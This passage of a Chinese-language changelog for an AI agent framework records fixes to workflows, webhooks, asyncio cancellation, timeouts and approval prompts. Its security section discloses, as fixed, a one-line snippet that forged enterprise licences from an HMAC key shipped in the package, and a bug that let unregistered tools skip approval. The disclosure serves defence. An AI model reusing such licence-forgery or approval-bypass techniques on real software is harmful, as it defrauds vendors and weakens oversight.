  出站事件是给自动化用的，不是数据同步通道。

### 新增 — 工作流即代码（最小版）

ReAct / Plan 两条路由 LLM 在**运行时**决定步骤；FDE 要交付给客户的却是**确定、
可评审、可版本化、可 diff** 的流程。

- **📄 YAML 定义 + 加载期校验**（`automind/workflow/`）：schema 版本强制、
  未知字段默认**报错**（不静默忽略）、重复 id / 未知 type / 引用不存在的步骤 /
  branch 目标不存在 / `on_failure` 语法 —— **一次报全部问题并给出行列号**。
- **🧩 四类步骤**：`tool`（走注册表，与 Web 用同一批工具）、`llm`（生成）、
  `human`（人工卡点，**没有审批通道就是拒绝**）、`branch`（受限比较，
  不做表达式求值）。
- **🔒 模板严格模式**：`{{ inputs.x }}` / `{{ steps.<id>.output }}` /
  `{{ env.NAME }}`，引用不存在的变量**抛错并附可用变量清单**，
  绝不做表达式求值（模板不能变成代码执行通道）。
- **🧪 dry-run 真的不执行**：只渲染参数并列出"将要做什么"；
  `python -m automind.workflow run x.yaml --dry-run`。
- **🧭 退出码**：0 全绿 / 1 有步骤失败 / 2 文件或校验错误 / 130 取消 ——
  可直接进 CI。
- **🌐 接口**：`POST /api/workflow/run|validate`、`GET /api/workflow/list`；
  `file` 参数有**目录白名单**（只允许 `<project_root>/workflows/` 下的
  yaml/yml/json，`resolve()` 后判穿越）—— 一份工作流能配任意工具与参数，
  等同于执行权限，不能接受任意绝对路径。

### 修复 — 结构化日志的键名撞上适配器位置参数

`_StdlibStructAdapter` 的位置参数原来就叫 `event`，于是
`logger.warning("...", event="task_start")` 直接
`TypeError: got multiple values for argument 'event'` —— 而 `event` 恰恰是这套
接口里最自然的结构化键名。异常发生在**日志调用自身**，会把调用点的整段逻辑一起
带走（实测：webhook 投递协程里的一次告警把整批投递跳过，重试逻辑根本没执行）。
已改名为 `_message` 并加用例锁住五个级别。
（这个坑只在**没装 structlog** 的降级路径上出现，而那是刻意支持的路径。）

### 修复 — 出站事件发往本机/内网时不再被系统代理截走

`webhooks` 的真实传输用的是 `urllib.request.urlopen`，它会读取 `HTTP_PROXY` /
`HTTPS_PROXY` 与 Windows 系统代理设置 —— 而 webhook 的目标经常恰恰是**本机或
内网的收集器**（客户自建的告警接收端、本机调试用的 `127.0.0.1`）。把发往
`127.0.0.1` 的请求交给代理，后果是代理直接断连（实测 `RemoteDisconnected`），
而现象看起来完全像"对端服务有问题"，排查方向会被彻底带偏。

- **🔌 本机/私网目标直连**（`ProxyHandler({})`），公网目标沿用系统代理设置；
  `localhost` / 回环 / 私网 / 链路本地地址都识别。

### 修复 — py3.11 上 CI 整条作业挂死：后台投递协程取消不干净

1.7.3 的第一次推送后，**ubuntu · py3.11** 那一档从 2 分钟变成不结束（另三档
两分多钟就绿了），最后被人工取消时已经跑掉 6 小时 —— 期间"红还是绿"完全不可知，
等于这道门暂时失效。日志里连是哪个用例都看不出来：堆栈全是 asyncio 内部帧。

排查路径（记下来是因为这套办法以后还用得上）：

1. 先让"挂住"必须自己暴露 —— 逐用例 `--timeout=180` + 作业 `timeout-minutes: 30`；
   于是那次失败在 3 分 56 秒点名报到，并给出行号级堆栈。
2. 堆栈形状说明问题不在用例体里，而在 **fixture 收尾**：
   `pytest_runtest_teardown → pytest_asyncio._scoped_runner → asyncio.Runner.close()
   → _cancel_all_tasks → run_until_complete(gather(...))` 再也不返回 ——
   即"关循环时取消残留协程"这一步有协程取消不掉。
3. 关循环前把残留协程点名（`tests/conftest.py` 里的取消探针，`AUTOMIND_CANCEL_PROBE=1`）：
   唯一残留的就是 `automind-webhook-delivery`（`WebhookDispatcher._run`）。

根因：投递协程空闲等待写的是 `await asyncio.wait_for(event.wait(), timeout)`。
`wait_for` 收到取消后并不能立刻返回 —— 它还要"取消自己的内层等待任务，再等它结束"，
而 **py3.11** 上这一步没能完成（3.12 的 `wait_for` 是用 `asyncio.timeout` 重写过的，
所以本地与其它三档都测不出来，只有 py3.11 挂）。

- **😴 空闲等待改成裸 sleep 轮询**（20ms，`_idle`）：等待期间**没有任何内层任务**，
  取消必定立刻生效 —— 代价只是唤醒延迟上限 20ms，而原本的兜底周期就是 0.25s。
  `flush` 的等待同样换掉（它也在关键路径上，且是同一类脆弱写法）。
- **🛑 收尾主动停协程，而不是等"关循环被动取消"**：新增 `WebhookDispatcher._stop_worker()`，
  `close()` 会真的停掉后台协程（此前只置一个标志位），`reset_for_tests()` 换投递器时
  先把旧的关掉（此前只换全局引用，**换一次漏一个协程**），新增进程级 `aclose()`，
  服务端 lifespan 收尾改为 `flush → aclose`。
- **🧹 顺手修掉一处同类写法**：`tools/background.py` 的 `kill()` 里
  `except (asyncio.CancelledError, Exception): pass` 会把**调用方自己**的取消一起吞掉
  （那正是"取消不掉的任务"的来源），现在只在"确实是自己取消的那个协程"上吞。
- **🛡 把它钉成硬不变量**：新增 4 条用例（空闲协程必须 1 秒内可取消、`aclose`、
  换投递器、实例 `close()` 都必须停掉协程），并在 CI 上开启取消探针 ——
  以后这类"吞掉取消/取消不掉"的缺陷会是一条**带任务名的失败**，而不是一条挂死的作业。

### 测试

- 新增 11 个测试文件、700+ 用例：token 预算链路、命令分段、敏感路径、管理分权、
  指标与就绪、日志键名、连接器（37）、webhook（91）、重放（26）、评测（45）、
  工作流（208，含 4 条真子进程用例）。
- 全量回归：社区 `python -m pytest -q`、`ruff check .`、`pro/tests`、
  前端 `tsc --noEmit` + `vite build` 全绿；`dist` 已重建。
- 三平台 CI 上暴露的两处**测试自身**的跨平台问题也已修：`tmp_path` 在
  macOS 是符号链接（`/var`→`/private/var`）、Windows CI 是 `RUNNER~1` 短名，
  替身未 resolve 会被判成"路径越界"；以及读了只在 Windows 存在的
  `os.environ["TEMP"]`（POSIX `KeyError`）。

### 说明

- 本版的口径是"**已经写下的承诺必须真的生效**"。上一版修的是"失败伪装成成功"，
  这一版修的是"**防护与治理从未被调用**"—— 两者是同一类病的不同阶段：
  前者是失败不吭声，后者是成功不落地。
- 已知边界（写在这里而不是藏起来）：**流式对话不产生重放记录**
  （`generate_stream` 没有单一响应对象，接线要改流式包装器）；
  工作流 v1 不支持循环/并行/子工作流/表达式，边界表见 `docs/WORKFLOWS.md`。

## [1.7.2] - 2026-09-16

**失败不再伪装成成功（补完注册环节）；AI 回答到一半，你可以随时插一句话**

这一版修的是七件"看起来已经做好、实际交付不了"的事：工具调用契约有两种形态、
工具组注册失败没人知道、参数名写错只能盲猜、外部程序缺失却让你去 pip、
中文日志在 Windows 上变成乱码；再补上一件用户一直在等的能力 —— **中途插话**。

### 新增 — 用户中途插入补充问题（AI 接住它并纳入本轮回答）

此前界面在执行期间把输入框**禁用**了：用户看到 AI 写到一半漏了一件事，
想补一句，第一件要做的事竟然是"先停下"。而唯一能"说话"的 `run` 动作
第一句就是"有旧任务就先 cancel" —— 补一句的实际效果是把那半截回答掐了重来。

- **📥 新增 WS 动作 `interject`**（别名 `inject` / `supplement`）：把补充
  排进**正在跑的那一轮**，什么都不取消。返回回执 `interjection_received`；
  模型真的读到后回 `interjection_applied`。
- **💬 对话模式（流式）边流边接**：每个增量都会看一眼队列，一有补充就在当前
  段落收尾、把已生成内容留在上下文里，带着补充继续生成 —— 续写接着**同一个
  气泡**往下显示，用户看到的是一段连续的回答，而不是"回答到一半突然重来"。
  一代最多续写 3 次（每次都是一次额外计费的调用），到上限的补充**退回队列**
  并如实告知，绝不静默丢弃。
- **🛠 工作/编程模式在步骤边界并入**：ReAct 每一步开始前取一次队列，补充以
  **user 消息**（不是 system 提示）进入上下文 —— 模型对"用户说了什么"和
  "系统提示说了什么"的权重完全不同。措辞明确写着"这是补充、不是新任务、
  不要重写已经给出的内容"，避免模型丢下手里的事重头开始。
- **📋 计划模式收尾补跑**：分层计划的动作是执行前定好的，一句补充改不了道；
  所以不假装能中途改道 —— 本轮结束前用一次 ReAct 把补充跑完，结果接在同一份
  交付后面，并标明"依据你执行途中的补充补跑"。
- **🧾 收下 ≠ 生效，两件事分开记账**：任务先结束、被取消、或到续写上限时，
  没并进去的补充会回 `interjection_dropped` 并明确告诉用户"这条没交给模型"。
  用户插了话却看不到任何反应，比拒绝更糟 —— 他会一直以为那句话在生效。
- **🔗 `ref` 精确对账**：前端可在请求里带 `ref`，服务端在**每一条**回执里原样
  回显（含 `interjection_applied` 的每个 item），连发两句相同内容也能各自归位，
  不用靠文本匹配去猜。
- **🌐 两套界面都已接入**：React 界面（新）与经典界面（`/legacy`）都能在
  执行期间继续输入、点「⤴ 插入」或按 Ctrl/Cmd+Enter 补话，气泡上带
  待纳入 / 已纳入 / 未纳入 / 已被拒 四态标记。

### 修复 — `dispatch` 的契约必须只有一种形态

`ToolRegistry.dispatch` 里 `self.get(tool_name)` 曾写在 `try` **之外**：工具自己
炸了返回失败的 `ToolResult`，工具名不认识却抛 `ToolNotFoundError` 逸出。同一个
入口两种形态，调用方必须两边都处理 —— 实际结果是只有 `react_executor` 补了那层
`except`，其余直接调 `dispatch` 的地方（技能、计划执行器、插件、CLI）全都没有，
一次工具名拼错就足以让整条链路崩掉。

- **✅ 现在无论发生什么，返回的都是 `ToolResult`**（未知工具名 → 失败结果 +
  建议；参数写错 → 失败结果 + 建议）。唯一还会抛的是 `BaseException`
  （取消必须照常传播，不能被当成工具失败吞掉）。
- **✂️ 未知工具名的错误不再被体积夹断**：旧消息是
  `Tool 'x' not found. Available: [...30+ 个工具名...]`，它会经过
  `output_budget` 的「头+尾」夹取，清单从中段被剪掉 —— 模型拿到的是一份
  **残缺**的工具表，比不给还糟（被剪断的半个名字会被当成真工具名再试一次）。
  现在只给最像的三个 + "完整清单在哪"，长度稳定在 200 字符内。

### 修复 — 参数名/工具名的模糊建议（`file_read` / `FileRead` / `read_file`）

- **🔍 名字只是写法不同 → 直接解析过去**：归一化后相同（`FileRead`、`file-read`、
  `FILE_READ`）或词集合相同（`read_file` ↔ `file_read`）且**唯一命中**时，按真名
  照常执行 —— 这类差异让一次调用白跑没有任何意义。有歧义（两个工具都可能）时
  不替模型做主，宁可报错。
- **🔤 参数名写错 → 执行**之前**就拦下**：带 `**kwargs` 的工具会把写错的参数
  **静默忽略**，然后拿默认值跑出一个"成功但答非所问"的结果。现在只要参数名
  很像某个声明的参数（`pathh` → `path`），就直接返回可照抄的纠正提示，
  工具一步都不执行。与 schema 无关的额外参数（`timeout` 这类约定）照旧放行。

### 修复 — 工具组注册失败不再静默（与 v1.6.4「失败不再伪装成成功」对齐）

- **🚫 去掉浏览器组的裸 `except Exception: pass`**：打包环境里 playwright 缺失时
  `web_fetch` / `browser` 会**整体消失**，模型看不到、用户界面也看不出，只会困惑
  "它怎么不会用浏览器"。
- **📢 六个可选工具组不再只写一行 `logger.warning`**：日志默认只进 stderr，
  桌面版/Web 版用户根本看不到 —— "少了六个工具"这件事在用户视角里从未发生过。
- **👁 现在三件事一起做**：留结构化账目、写日志、**让用户看见** —— 任务前自检
  直接把它变成界面上的告警（含 `pip install …` 或平台安装命令），并新增
  `GET /api/tools/registration` 供工具面板查询"你到底少了哪些能力、怎么补回来"。

### 修复 — `need()` 对外部二进制给的是 pip 药方

`pytesseract` 只是 tesseract **引擎的壳**：`pip install pytesseract` 装完，真正
干活的外部程序仍不在系统里，OCR 照旧失败 —— 而错误信息里给的还是那句 pip 命令。
用户照着做一遍，问题一字不变，形成"提示 → 照做 → 还失败 → 看提示"的死循环。
ffmpeg 同理（PyPI 上那个同名包不提供可执行文件）。

- **🧩 新增 `MissingBinary` / `need_binary()` / `find_binary()`**：缺 Python 包
  → pip 命令；缺**外部程序** → 该平台的安装命令（winget / brew / apt），并明确
  写出"这不是 Python 包，pip 装不了它"。
- **🔎 `need()` 导入成功后**还会检查它依赖的外部命令：装了壳没装引擎的情况
  现在会被点破（"pip 里的 pytesseract 已经装上，但它只是个壳…"）。
- **🪟 Windows 兜底**：PATH 里没有时再找一遍安装器默认目录
  （Tesseract-OCR、`C:\ffmpeg\bin`、Git），并支持
  `AUTOMIND_TESSERACT_CMD` / `AUTOMIND_FFPROBE_CMD` 指定非标准路径，
  而不是逼用户去改系统 PATH。

### 修复 — Windows GBK 控制台下中文日志乱码

Windows 上 Python 的 stdio 编码取自**当前代码页**（简中环境 = cp936/GBK）。
只要输出不是"真正的控制台"——被 IDE、CI、启动器、管道、桌面壳接管 ——
Python 写出去的就是 GBK 字节，而接收方几乎总是按 UTF-8 解码，中文日志与中文
报错整片变乱码。此前的临时解法是让用户自己设 `PYTHONIOENCODING=utf-8`。

- **🧭 新增 `ensure_utf8_stdio()`**：把这件事做成自动的，但有边界 ——
  只处理 Windows；用户显式设了 `PYTHONIOENCODING` / `PYTHONUTF8` 就完全尊重；
  **真控制台不改编码**（它按代码页渲染中文本来就是对的，改了反而会弄花），
  只把 `errors` 收紧为 `replace`；只有非控制台（管道/重定向/IDE）才切成 UTF-8。
- **🛡 顺带堵住一个附带故障**：`errors="replace"` 让"一个字符编码不了"不再
  变成"一屏 `UnicodeEncodeError` 堆栈"，也不会把日志系统本身弄挂。
- **🔌 挂在 `get_logger()` 上**：25+ 个模块导入期就会调用它，等价于"本库被使用
  的第一现场" —— CLI / Web 服务 / 桌面壳 / 直接 import，无论从哪进都不会乱码，
  不用每个入口各记一次。可用 `AUTOMIND_UTF8_STDIO=0` 关闭。

### 测试

- 新增 `tests/core/test_interject.py`（队列语义、渲染措辞、流式续写、上限退回、
  ReAct 步骤边界并入）、`tests/server/test_ws_interject.py`（**不打断任务**、
  三种去向都有回执、`ref` 回显、登记必须被 `finally` 兜住）、
  `tests/core/test_console_encoding.py`（含真起一个子进程的端到端断言：
  不设任何环境变量，输出的中文必须能按 UTF-8 读懂）、
  `tests/core/test_tool_registration_failures.py`、
  `tests/tools/test_dispatch_contract.py`、`tests/tools/test_external_binaries.py`。
- `tests/server/routes_snapshot.txt` 同步新增的 `/api/tools/registration`。
- 全量回归：社区版 `python -m pytest -q`、`ruff check .`、前端 `tsc --noEmit`
  与 `vite build` 全绿；前端产物 `automind/static/dist` 已重新构建。

### 说明

- 写测试时踩到三个"只有跑起来才会现形"的坑，都已写成注释留在用例里：
  ① pytest 的全局捕获会在**调用阶段开始**替换 `sys.stdout`，夹具里 patch 的
  假流会被覆盖（单跑通过、与其它文件一起跑就失败）；② `ast.parse` 检查不出
  `async for` 写在了非 async 函数里 —— 语法自检要用 `compile()`；
  ③ 编码类用例必须把"解释器是否已在 UTF-8 模式"钉死：CI runner 设了
  `PYTHONUTF8=1`，同一份用例在 CI 走进「跳过」分支、本地走进「修复」分支
  （本地绿 CI 红）—— 判据因此抽成 `_interpreter_is_utf8()` 以便替换，
  并在 CI 同款环境下复跑验证过。

## [1.7.1] - 2026-09-15

**长任务的最后两道防线：任何一步都有上限，且阻塞不再冻住整个进程**

v1.7.0 修掉了三类最常见的卡死（重复动作空转、并行批挂起、审批等待挂死），
但复盘时实测出**两个仍然会真卡住**的路径。这一版把它们补上，并顺手揪出一个
"悄悄跳过步骤"的缓存 bug。

### 修复 — ReAct 单步工具超时（此前完全没有）

单步超时此前**只加在了 Plan 路径**（`goal_timeout`），而编程/工作模式真正走的
是 ReAct。实测：ReAct 里一个工具永不返回，任务无限期停在第 1 步，没有任何收尾。

- **⏱ 每次工具调用都有等待上限**：新增 `execution.react_tool_timeout_seconds`
  （默认 300 秒）。超时转成该动作的失败结果喂回模型，**循环继续** ——
  模型有机会换做法，而不是整个任务停在那里。
- **📝 超时说明必须可执行**：结果里写明"输出已丢弃、不要再原样重试同一组参数"，
  并给出两条具体出路（调大 `timeout` 参数到上限、改走
  `terminal(background=true)` 后台通道）。空手说"超时了"只会让模型再试一遍。
- **🔗 复用已有熔断链路**：连续超时会和"连续失败"一样触发熔断，
  不会出现"模型一直等到超时上限耗尽"。
- **🎛 上限可由模型申请放宽**：参数里的 `timeout` 会被采纳，但不超过
  `tool_timeout_max_seconds`。这样不会出现"命令自己允许跑 600 秒、
  外层 300 秒就把它掐了"的矛盾。
- **📡 实时可见**：新增 `tool_timeout` 事件，界面上直接显示
  "⏱ 单步超时：terminal"；部分交付清单里也会写明本次有几次单步超时。
- 可配：`0` = 不限制（恢复旧行为，给排障留后路）。

### 修复 — 同步阻塞调用不再冻住整个进程

工具都是 `async def`，但函数体里藏着同步调用。它们的共同特点是**等待期间不
释放事件循环**，后果不只是"这个工具慢"：

- 整个进程的 asyncio 循环被占死 —— 其它会话的任务、审批弹窗推送、心跳与进度条、
  `/api/health` 全部一起冻住；
- **任何 `asyncio.wait_for` 超时都不会触发**（定时器轮不到执行），
  也就是上一项"每一步都有上限"会形同虚设。

实测（修复前）：一个 `time.sleep(20)` 的同步工具配 `goal_timeout=2`，
实际耗时 **20.0 秒、超时未生效**。

- **🧵 新增 `automind.tools._toolkit.run_blocking`**：把阻塞调用挪进线程池的
  统一写法（附为什么必须这么做的说明），让后来写工具的人有地方照抄。
- **📋 四处调用点全部迁移**：`clipboard_tool`（`pyperclip` 在 Windows 上被
  别的进程占用剪贴板时会一直等）、`collab_tools` 的三平台通知
  （PowerShell toast / osascript / notify-send，各 20 秒）、
  `media_tools` 的 `ffprobe`(60s) 与 `ffmpeg`(120s)、`git_tool` 的
  `subprocess.run`(180s)。其中 ffprobe 那处实测能让**界面僵住一分钟以上**。
- **🛡 扫描式护栏**：新增 AST 用例，工具目录里再出现"裸跑的同步 subprocess"
  会直接让 CI 红掉 —— 单点测试只能证明"改过的地方还在"，拦不住新加的工具
  又写成同步的。

### 新增 — 整轮任务总时长预算

单步超时管"某一步卡住"、无进展检测管"原地打转"，都管不住"每步都正常但整体
就是跑不完"：50 步 × 单次 LLM 5 分钟的理论上限是 **4 小时以上**。

- **⏳ `execution.max_task_seconds`**（默认 0 = 不限）：到点**不再开新步骤**，
  把已完成的工作完整交出去（部分交付清单 / 执行报告），而不是硬掐断。
- ReAct 与 Plan 两条路径都支持；Plan 路径会把未开始的目标如实标注为
  "总时长预算已到点，该步骤未开始"，并提示怎么放开限制。
- 判据放在"步骤之间"而非"任意时刻强杀"：强杀会丢掉已经做完的工作，
  而这正是用户最不能接受的那种失败。

### 修复 — 计划执行器的只读缓存会跨步骤"跳过"操作

给"总时长预算"写测试时撞出来的：`_subtask_cache` 的键此前只有
**工具名 + 参数**，不含目标身份。于是两个语义完全不同的步骤只要调了同一个
工具、同一组参数（例如都要读同一份配置），第二个就会被**当成缓存命中直接判
成功** —— 它一步都没执行，报告里却记成"已完成"。

实测：3 个步骤只真的执行了 1 次（`cache_hits=2`，`completed_steps=3`）。

- **🔑 缓存键加入目标身份**：缓存的本意是"同一个步骤的重试/纠错重跑别重复读"，
  而不是"不同步骤同参就算做完"。同一目标内的复用照旧生效。
- 原有用例 `test_safe_tool_same_params_cached` 其实把这个 bug 当成了预期行为
  （它断言"3 个步骤只执行 2 次"），已按正确语义重写，并补了一条
  专门盯跨步骤复用的用例。

### 测试

- 新增 `tests/planning/test_long_task_guards.py`（23 条）：单步超时（含参数申请
  放宽、上限钳制、`0` 关闭、超时事件、熔断复用、清单呈现）、
  阻塞调用挪出事件循环（心跳在阻塞期间仍在跳、`wait_for` 真的会触发、
  三个模块的迁移检查、**全目录 AST 扫描护栏**）、整轮预算（ReAct / Plan
  两条路径、已完成成果保留、接线检查）、以及跨步骤缓存 bug 的两个方向。
- 重写 `tests/planning/test_hang_boundaries.py`（7 条）：两个缺口已修，断言从
  "记录当前没有保护"翻成**正面断言**，并保留修复前后的实测数据作为注释 ——
  将来若把 `react_tool_timeout_seconds` 默认改回 0，这几条会失败，
  正好提醒"你在重新打开一条已知的卡死路径"。
- 修正 `tests/core/test_autonomy.py` 里把缓存 bug 当预期的那条用例，
  并补一条专盯跨步骤复用的用例。
- 全量回归：社区 `991 passed / 3 skipped`、商业包 `73 passed`、
  分析服务 `1 passed`；`ruff check .` 与 `tsc --noEmit` 全绿，
  前端 dist 已重新构建。

## [1.7.0] - 2026-09-15

**付费墙真的能挡人了；"原地打转"在烧光预算之前被叫停**

这一版修的是四类"看不见的漏洞"：能被**伪造**的商业授权、完全**没有测试**的
商业代码、会**静默卡死**的并行批次、以及**不报错但没进展**的死循环。
外加一处审批链路上的断点 —— 那条链路一旦断，用户看到的只是"任务卡住了"。

### 安全 — 企业版付费墙（最高优先级）

此前企业版授权是**对称 HMAC 签名**，而签名密钥**硬编码在随包分发的模块里**，
签发函数（`generate_license`）与校验函数（`parse_license`）还在**同一个文件**。
后果：任何 `pip install automind-pro` 过的人 —— 客户、CI 缓存、内网镜像、
直接读 PyPI 的人 —— 抄下那串常量就能批量生成永久企业版许可证：

```python
from automind_pro.license import generate_license
generate_license("ENT", "00000000", "任意客户")   # 修复前：永久企业版到手
```

对称签名的结构性问题在于**验证方必然持有签发能力**。修法不是"把密钥藏深一点"：

- **🔐 改为 Ed25519 非对称签名**：分发包里**只有公钥**，验签不需要私钥，
  用公钥推不出私钥 —— 拿到 wheel 的人再也伪造不出许可证。
  实现是纯标准库（不引入 `cryptography` / `PyNaCl` 这类重依赖），
  并对着 RFC 8032 §7.1 官方测试向量逐条验证。
- **🗝 签发私钥移出分发包**：签发走发行方离线工具 `pro/tools/issue_license.py`，
  私钥来自环境变量或本机文件，**不进 wheel、不进 sdist、不进 git**。
  打包配置显式排除 `tools/`，sdist 另有 `MANIFEST.in` 白名单；
  CI 另加两道审计（源码树 + 构建产物）。
- **⛔ 旧格式许可证默认整类拒绝**：v1（HMAC）的密钥已经泄露，接受它等于把
  付费墙重新打开。仅在显式设置 `AUTOMIND_LICENSE_ALLOW_LEGACY_HMAC=1` 时
  才校验旧证，供存量客户在换证窗口期临时过渡。
- **🚫 未置备公钥 = 激活不了**（fail-closed）：宁可商业版起不来，
  也不能出现"公钥是占位符所以谁都验得过"这种反向失效。
- **📋 客户名归一化**：`-` 是格式分隔符，会被归一掉（`acme-corp` → `acmecorp`），
  避免客户名与分隔符混淆造成的解析歧义。
- 新增 `python -m automind_pro.license status` —— 一条命令说清"为什么没激活"
  （公钥没置备 / 没配许可证 / 配了但无效）。
- 商业包版本号与社区核心**对齐发布**（此前核心 1.6.4、商业包 1.5.1，
  用户完全看不出该配哪个）。

### 新增 — CI 补齐第四处盲区：收钱的那部分代码

`pytest tests/` 只覆盖社区核心。`pro/tests/`（三千多行企业版代码：
付费墙、会话池、SSO/LDAP、RBAC、模型网关）与 `analytics-service/tests/`
**从未在 CI 里执行过**。反差在于 `ci.yml` 的注释自己写着"此前有三处盲区，
每一处都真实地漏过缺陷" —— 而第四处漏的是收钱的部分。

- **🧪 新增 `pro` 作业**（ubuntu + windows 双平台）：装商业包、跑 `pro/tests/`、
  跑 `ruff check pro/`，并**单独再跑一遍许可证伪造测试**。
- **🧪 新增 `analytics` 作业**：`analytics-service` 的依赖与测试此前完全没有
  进入过 CI。
- **🔒 新增两道私钥审计**：源码树里不得出现 64 位 hex 形式的签发私钥；
  构建产物（wheel + sdist）的成员名与内容里都不得含私钥/签发工具。
- **🚧 新增"商业包装完不能签发"冒烟**：装进干净 venv 后验证
  「能验签、不能凭空签发、伪造必败」三件事。

### 修复 — ReAct 无进展 / 重复动作（复杂任务原地打转）

此前的熔断只覆盖「同一工具**连续失败** 3 次」。**成功但重复**的动作完全不受控 ——
反复 `file_read` 同一路径、反复跑同一条命令、反复写同一个文件。唯一兜底是
`max_iterations=50`：不报错、不提醒，一路烧到第 50 步才停，而每步都要重发
工具 schema + 全量消息。

- **🔁 动作指纹 + 先提示后拦截**：连续出现**完全相同**的动作（工具名 + 规范化
  参数）时，第 N 次仍执行但附带**具体**纠偏指引（"文件内容已经在上下文里了，
  请基于它继续，或用 offset/limit 读还没看过的部分"），再下一次直接拦截，
  把指引当结果喂回模型。本地判定，**零 token**。
- **🛑 提前收尾而非烧到上限**：无进展拦截累计到阈值即停止并返回「部分交付清单」，
  清单里明确写出「无进展信号：重复动作 N 次、拦截 M 次、反复被拦的动作是哪些」。
- **📡 实时可见**：新增 `react_no_progress` 事件，界面上直接显示
  "🔁 无进展：file_read"——不用等到任务结束才知道它卡住了。
- **🎯 不误杀真进展**：只拦**逐字相同**的动作。参数不同（分段读文件、逐条处理、
  带 UUID/时间戳的调用）一律放行 —— 误杀真进展比漏掉一次重复更糟。
- 可配：`execution.react_repeat_action_threshold`（默认 2）、
  `react_no_progress_limit`（默认 12，0 = 只拦不提前收尾）。

### 优化 — 跨轮结果去重（成本类）

Plan 路径早有 `_subtask_cache` 复用只读调用，**ReAct 路径一直没有**：同一份文件
内容被反复读进上下文，只有体积截断（output_budget）与旧消息折叠（compact）在救，
而折叠要等预算用到 80% 才触发。

- **♻️ 只读结果跨轮复用**：SAFE 级只读工具的相同调用直接复用上次结果，
  不重复执行、不重复进上下文。写类工具与有副作用的工具（notify/剪贴板/截图/
  terminal/进程管理…）绝不缓存 —— 同参重放可能是**故意的**（重试、幂等写）。
- **📝 相同结果不再原样重发**：`FunctionCallHandler` 对完全相同的调用只留一条
  引用说明（<200 字符），而不是把几千字符的正文再贴一遍；**结果变了**（文件被
  改过）则视为新信息完整下发。此前这份内容会在每一轮请求里重新付一次钱。
- 新增账目 `duplicate_results_shortcircuited` / `results_reused` /
  `repeat_actions_blocked`，随 `react_savings` 推入观测中心。

### 修复 — 并行批次只兜异常，兜不住挂起

`plan_executor.py` 的并行批此前只有"异常屏障"：它解决的是"**抛出来**"。
但 **hang 不是异常** —— 一个目标卡在网络读 / 子进程 / 审批上时既不返回也不抛错，
`asyncio.gather` 会一直等下去，整批（连同整个计划）就此停滞，
用户看到的只是"界面没反应"。

- **⏱ 单目标执行上限**：`execution.goal_timeout_seconds`（默认 900s）。
  超时就地转成该目标的失败结果（措辞明确区分"超时中止"与"做了但失败"），
  同批其它目标的成果照常入账。
- **🛡 批级兜底**：批内目标若屏蔽了取消（同步阻塞调用跑在事件循环里），
  单目标 `wait_for` 自己也会被卡住 —— 因此批级再用 `asyncio.wait` 到点就走，
  **保证 gather 一定返回**。
- **🔗 串行路径同样带上限**：批里只有一个目标时不会挂"是过去的假设；
  实测那条路径此前完全没有超时保护。

### 修复 — 审批模式（确保可正常使用、弹窗必达）

- **📨 弹窗发不出去 = 当场拒绝**：`ws.send_json` 抛异常时（连接刚断、
  代理掐流）此前既不返回也不上报，任务一路挂到 300 秒超时。现在立刻按拒绝收尾
  并把原因写进结论。
- **🔌 连接断开立刻终结待决审批**：此前回调要等满整个超时；换个窗口看到的就是
  "它卡住了"，等待计数与并发槽也跟着虚占。现在断开即 fail-closed 收尾。
- **🪟 多窗口可达**：审批弹窗会补发到**同一会话的其它标签页**，
  在哪个窗口点都生效 —— 不必回到发起任务的那个窗口。
- **🔁 审批模式改动落到已存在的会话上**：此前只改全局 agent，而会话克隆在创建时
  就固化了模式 —— 表现为"我明明设成「询问」了，它怎么没问我"。
  现在 `/api/config/approval` 会同步所有在线会话。
- **🚪 未注册的工具不再绕过审批**：plan 路径的权限检查此前整段包在
  `if tool is not None:` 里 —— 工具名写错/未注册时审批一起被跳过，
  表现为"配了「询问」也不弹窗"。现在统一按最高风险等级送审。
- **✋ 迟到的回答有回执**：审批已超时/已结束时用户才点，会明确告知
  "这次审批已经结束，本次点击不再生效"，而不是静默丢弃。
- **🔢 诊断口径分离**：`/api/health` 新增 `approval_pending`（待决审批数），
  与 `approval_waiting`（已让出并发槽的等待数）区分开。

### 测试

- 新增 `pro/tests/test_license_forgery.py`（28 条）：含 RFC 8032 官方向量、
  自造密钥伪造必败、用**已泄露的旧密钥**伪造必败、小阶公钥拒绝、
  未置备公钥 fail-closed、签发工具不在包内、打包配置排除 `tools/`。
- 新增 `tests/planning/test_react_no_progress.py`（21 条）：重复动作提示/拦截、
  参数不同不误杀、无进展提前收尾、清单含无进展证据、只读复用、
  写类与副作用工具不缓存、上下文去重、结果变化仍完整下发。
- 新增 `tests/planning/test_plan_parallel_timeout.py`（16 条）：挂起目标超时
  不拖死同批、超时措辞、异常屏障未被弄丢、并行度未退化为串行、
  串行路径超时、未注册工具的审批门控（含按 DANGEROUS 送审）与 fail-closed、
  「修改后批准」生效。
- 新增 `tests/server/test_approval_flow.py`（21 条）：真实 WebSocket 往返
  （弹窗必达 → 批准/拒绝/改参数 → 执行或不执行）、超时告知、断连立刻收尾、
  迟到回执、多窗口补发、审批模式同步到会话克隆、前后端事件契约。
- 新增版本一致性约束：商业包与社区核心同版本、私钥必须在 `.gitignore` 里、
  社区包不得包含商业路径。
- 全量回归：社区 `959 passed / 3 skipped`、商业包 `73 passed`、
  分析服务 `1 passed`；`ruff check .` 与 `tsc --noEmit` 全绿。
  （唯一未通过的是 `tests/tools/test_browser_fallback.py` 中那条真实联网用例，
  在无外网环境必然超时，与本版改动无关。）

### 发布

- 版本号五处同步：`automind/__init__.py`、`pyproject.toml`、`web/package.json`、
  `desktop/installer.iss`、`pro/*`（新增 `tests/test_version_consistency.py`
  自动校验，漏改任何一处 push 前即红）。
- `RELEASE.md` 补齐新的许可证签发流程（keygen → 贴公钥 → 离线签发）。

## [1.6.4] - 2026-09-14

**失败不再伪装成成功；看不见的损失全部留痕**

这一版处理的不是"新功能"，而是**十处会让用户被骗的静默路径**：设施故障被记成
通过、覆盖了别人的成果却没人知道、上下文被工具输出撑爆、命令超时后状态全丢、
审批挂起白占并发名额、进程重启后没有任何执行证据。每一处都改成"要么真的做成，
要么明确说清没做成"。

### 修复 — 失败静默化（最严重的一类）

- **🧐 审查设施故障不再被记成「审查通过 ✓」**：`_review_result` 此前把所有异常
  （模型 502、返回不是 JSON、只读核实过程报错）都吞成 `{"approved": True}`，
  于是模型一挂，闭环摘要照样打印一句「审查通过 ✓」—— 用户看到的是一个**从未
  发生过的审查结论**。现在返回结构区分「通过 / 有意见 / 审查不可用」三态，
  不可用时摘要明确写「审查未执行（设施不可用）」，并附一行说明
  "该环节未真正执行，请勿据此认为已通过"。
